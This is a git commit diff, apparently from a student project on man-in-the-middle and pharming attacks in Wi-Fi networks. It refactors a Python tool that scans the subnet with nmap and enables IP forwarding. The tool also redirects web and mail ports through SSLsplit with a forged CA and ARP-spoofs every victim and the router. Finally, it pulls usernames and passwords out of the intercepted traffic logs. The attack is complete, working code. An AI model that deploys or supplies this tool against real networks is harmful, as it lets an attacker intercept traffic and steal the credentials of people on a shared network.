19eb70cb63f451b0615e783fb927eb5d3697ed13
Chilin Ubuntu 20.04 <sky707070.cv07@nctu.edu.tw>
2021-04-19 01:17:18 +0800

    Update SSLsplit

--- Project2-MITM-and-Pharming-Attacks-in-Wi-Fi-Networks/arp.py
+++ Project2-MITM-and-Pharming-Attacks-in-Wi-Fi-Networks/arp.py
@@ -6,114 +6,7 @@ import re
 import fcntl
 from scapy.all import *
 from time import *
-
-"""
-get ip address of host
-link: https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib?page=1&tab=votes#tab-top
-"""
-def getHostIp():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    ip = s.getsockname()[0]
-    s.close()
-    return ip
-
-"""
-get information of NIC using "ip addr" command
-"""
-def nicInfo():
-    proc = subprocess.Popen(["ip addr"],stdout=subprocess.PIPE, shell=True)
-    (out, err) = proc.communicate()
-    ipaddr = out.decode("utf-8")
-    ip = re.findall("\d+\.\d+\.\d+\.\d+\/\d+", ipaddr)
-    # mac = re.findall(
-    #     "[0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}", ipaddr)
-    return ip
-
-def getNic():
-    proc = subprocess.Popen(["ip route"], stdout=subprocess.PIPE, shell=True)
-    (out, err) = proc.communicate()
-    nic = out.decode("utf-8")
-    nic = re.split(" ",nic)
-    return nic[4]
-
-"""
-by "nmap" command, we can scan all device which have 
-link : https://stackoverflow.com/questions/13212187/is-it-possible-to-get-the-mac-address-for-machine-using-nmap
-link : https://superuser.com/questions/887887/different-behavior-sudo-nmap-vs-just-nmap
-"""
-def nmap(ip):
-    tmp = "nmap -sn -n " + ip 
-    print("Command is ",tmp)
-    proc = subprocess.Popen([tmp], stdout=subprocess.PIPE, shell=True)
-    (out, err) = proc.communicate()
-    out2 = out.decode("utf-8")
-    return out2
-
-"""
-https://stackoverflow.com/questions/2761829/python-get-default-gateway-for-a-local-interface-ip-address-in-linux/6556951
-"""
-def get_default_gateway_linux():
-    """Read the default gateway directly from /proc."""
-    with open("/proc/net/route") as fh:
-        for line in fh:
-            fields = line.strip().split()
-            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
-                # If not default route or not RTF_GATEWAY, skip it
-                continue
-
-            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
-
-"""
-regular expression for:
-ipV4 : https://stackoverflow.com/questions/4260467/what-is-a-regular-expression-for-a-mac-address
-MAC address : https://stackoverflow.com/questions/4260467/what-is-a-regular-expression-for-a-mac-address
-"""
-
-"""
-https://stackoverflow.com/questions/159137/getting-mac-address
-"""
-
-def getMac(ifname):
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack(
-        '256s', bytes(ifname, 'utf-8')[:15]))
-    return ':'.join('%02x' % b for b in info[18:24])
-
-"""
-https://unix.stackexchange.com/questions/14056/what-is-kernel-ip-forwarding
-https://linuxconfig.org/how-to-turn-on-off-ip-forwarding-in-linux
-
-開啟 linux ip forwarding, 可以使整台機器像台 router, 
-一旦收到不屬於此 local machine 的封包, 就往 gateway 送
-"""
-def enable_port_forwarding():
-    flag = 1
-    flag = str(flag)
-    os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')
-    os.system('iptables -t nat -F')
-    os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080')
-    os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')
-    os.system('iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443')
-    os.system('iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443')
-    os.system('iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443')
-    os.system('iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080')
-    
-def sslsplit():
-    # os.system('sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080')
-    # tmp = "sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080"
-    os.system("mkdir logdir")
-    os.system("mkdir /tmp/sslsplit")
-    proc = subprocess.Popen(
-        # ["sslsplit", "-l", "connections.log", "-j", "/tmp/sslsplit/", "-S", "logdir/", "-k", "ca.key", "-c", "ca.crt", "ssl", "0.0.0.0", "8443", "tcp", "0.0.0.0", "8080],
-        ["sslsplit -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080"],
-        stdout=subprocess.PIPE,
-        shell=True)
-
-def disable_port_forwarding():
-    flag = 0
-    flag = str(flag)
-    os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')
+import util
 
 if __name__ == "__main__":
     
@@ -135,23 +28,25 @@ if __name__ == "__main__":
         if(i.split("/")[0]==ip):
             ip = i
             break
-
+    
+    # execute "nmap" 
     result = nmap(ip)
     print(result)
 
-    # regular expression for IPv4
+    # we can get all ip and mac address of all device which in same subnet from the result of nmap
+    # regular expression for IPv4, get the list of all device's ip address
     ip = re.findall("\d+\.\d+\.\d+\.\d+", result)
-    # regular expression for MAC 
+    # regular expression for MAC, get the list of all device's mac address
     mac = re.findall(
         "[0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}", result)
 
+    # since we neither need to show Host's ip and mac address nor Router's ip and mac
+    # remove them from ip and mac list
     for i in ip:
         if(i == hostip):
             ip.remove(i)
             break
 
-    print(ip)
-    print(mac)
     _len = len(ip)
     for i in range(0, _len):
         if(ip[i] == routerIp):
@@ -159,7 +54,8 @@ if __name__ == "__main__":
             ip.remove(ip[i])
             mac.remove(mac[i])
             break
-
+    
+    # show all device's ip and mac address
     print("")
 
     print("nic card: ", nic)
@@ -175,11 +71,15 @@ if __name__ == "__main__":
     for i in range(0,len(ip)):
         print("%-18s       %s" % (ip[i],mac[i]))
 
+    # enable ip forwarding of Linux device
     enable_port_forwarding()
+
+    # execute sslplit 
     sslsplit()
 
     try:
         while(1):
+            # send arp relies spoofing
             print(" ")
             for j in range(0,len(ip)):
                 if(ip[j]!="10.0.2.2" and ip[j]!="10.0.2.3"):
@@ -194,13 +94,14 @@ if __name__ == "__main__":
                                         hwdst   =   routerMac,      # router's MAC
                                         psrc    =   ip[j],          # victim's IP
                                         hwsrc   =   hostmac)        # attacker's MAC
-                                        
+
                     # verbose=0 : make the function totally silent
                     # More : help(send)
                     # https://stackoverflow.com/questions/15377150/how-can-i-call-the-send-function-without-getting-output
                     send(victimpacket, verbose=0)
                     send(routerpacket, verbose=0)
 
+            # get all username and password in log file
             print(" ")
             print("-----------------------------------------------------------------------------")
             for file in os.listdir("logdir/"):
@@ -209,7 +110,6 @@ if __name__ == "__main__":
                         if ("username=" in line) and ("password=" in line):
                             a = [m.start() for m in re.finditer("&", line)]
                             b = [m.start() for m in re.finditer("=", line)]
-                            # print(a, b)
                             print("username= %s  password= %s" % (line[b[0]+1:a[0]], line[b[1]+1:a[1]]))
             sleep(2)
     finally:
--- Project2-MITM-and-Pharming-Attacks-in-Wi-Fi-Networks/util.py
+++ Project2-MITM-and-Pharming-Attacks-in-Wi-Fi-Networks/util.py
@@ -1,22 +1,133 @@
-class ipMAC:
-    def __init__(self, ip, mac):
-        this.ip = ip
-        this.mac = mac
 
-import os
-import re
+"""
+get ip address of host
+link: https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib?page=1&tab=votes#tab-top
+"""
 
-if __name__ == "__main__":
-    # username=0711282&password=xxxxxxx&captcha_code=6135HTTP/1.1 303 See Other
-    # https://stackoverflopw.com/questions/4664850/how-to-find-all-occurrences-of-a-substring
-    for file in os.listdir("logdir/"):
-        with open("logdir/" + file, 'r', encoding='utf-8', errors='ignore') as f:
-            for line in f:
-                if ('username=' in line) and ("password=" in line):
-                    a = [m.start() for m in re.finditer("&", line)]
-                    b = [m.start() for m in re.finditer("=", line)]
-                    print(a,b)
-                    print(line[b[0]+1:a[0]],line[b[1]+1:a[1]])
-                    break
 
-                
+def getHostIp():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip = s.getsockname()[0]
+    s.close()
+    return ip
+
+
+"""
+get information of NIC using "ip addr" command
+"""
+
+
+def nicInfo():
+    proc = subprocess.Popen(["ip addr"], stdout=subprocess.PIPE, shell=True)
+    (out, err) = proc.communicate()
+    ipaddr = out.decode("utf-8")
+    ip = re.findall("\d+\.\d+\.\d+\.\d+\/\d+", ipaddr)
+    # mac = re.findall(
+    #     "[0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}", ipaddr)
+    return ip
+
+
+def getNic():
+    proc = subprocess.Popen(["ip route"], stdout=subprocess.PIPE, shell=True)
+    (out, err) = proc.communicate()
+    nic = out.decode("utf-8")
+    nic = re.split(" ", nic)
+    return nic[4]
+
+
+"""
+by "nmap" command, we can scan all device which have 
+link : https://stackoverflow.com/questions/13212187/is-it-possible-to-get-the-mac-address-for-machine-using-nmap
+link : https://superuser.com/questions/887887/different-behavior-sudo-nmap-vs-just-nmap
+"""
+
+
+def nmap(ip):
+    tmp = "nmap -sn -n " + ip
+    print("Command is ", tmp)
+    proc = subprocess.Popen([tmp], stdout=subprocess.PIPE, shell=True)
+    (out, err) = proc.communicate()
+    out2 = out.decode("utf-8")
+    return out2
+
+
+"""
+https://stackoverflow.com/questions/2761829/python-get-default-gateway-for-a-local-interface-ip-address-in-linux/6556951
+"""
+
+
+def get_default_gateway_linux():
+    """Read the default gateway directly from /proc."""
+    with open("/proc/net/route") as fh:
+        for line in fh:
+            fields = line.strip().split()
+            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
+                # If not default route or not RTF_GATEWAY, skip it
+                continue
+
+            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
+
+
+"""
+regular expression for:
+ipV4 : https://stackoverflow.com/questions/4260467/what-is-a-regular-expression-for-a-mac-address
+MAC address : https://stackoverflow.com/questions/4260467/what-is-a-regular-expression-for-a-mac-address
+"""
+
+"""
+https://stackoverflow.com/questions/159137/getting-mac-address
+"""
+
+
+def getMac(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack(
+        '256s', bytes(ifname, 'utf-8')[:15]))
+    return ':'.join('%02x' % b for b in info[18:24])
+
+
+"""
+https://unix.stackexchange.com/questions/14056/what-is-kernel-ip-forwarding
+https://linuxconfig.org/how-to-turn-on-off-ip-forwarding-in-linux
+
+開啟 linux ip forwarding, 可以使整台機器像台 router, 
+一旦收到不屬於此 local machine 的封包, 就往 gateway 送
+"""
+
+
+def enable_port_forwarding():
+    flag = 1
+    flag = str(flag)
+    os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')
+    os.system('iptables -t nat -F')
+    os.system(
+        'iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080')
+    os.system(
+        'iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')
+    os.system(
+        'iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443')
+    os.system(
+        'iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443')
+    os.system(
+        'iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443')
+    os.system(
+        'iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080')
+
+
+def disable_port_forwarding():
+    flag = 0
+    flag = str(flag)
+    os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')
+
+
+def sslsplit():
+    # os.system('sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080')
+    # tmp = "sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080"
+    os.system("mkdir logdir")
+    os.system("mkdir /tmp/sslsplit")
+    proc = subprocess.Popen(
+        # ["sslsplit", "-l", "connections.log", "-j", "/tmp/sslsplit/", "-S", "logdir/", "-k", "ca.key", "-c", "ca.crt", "ssl", "0.0.0.0", "8443", "tcp", "0.0.0.0", "8080],
+        ["sslsplit -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080"],
+        stdout=subprocess.PIPE,
+        shell=True)
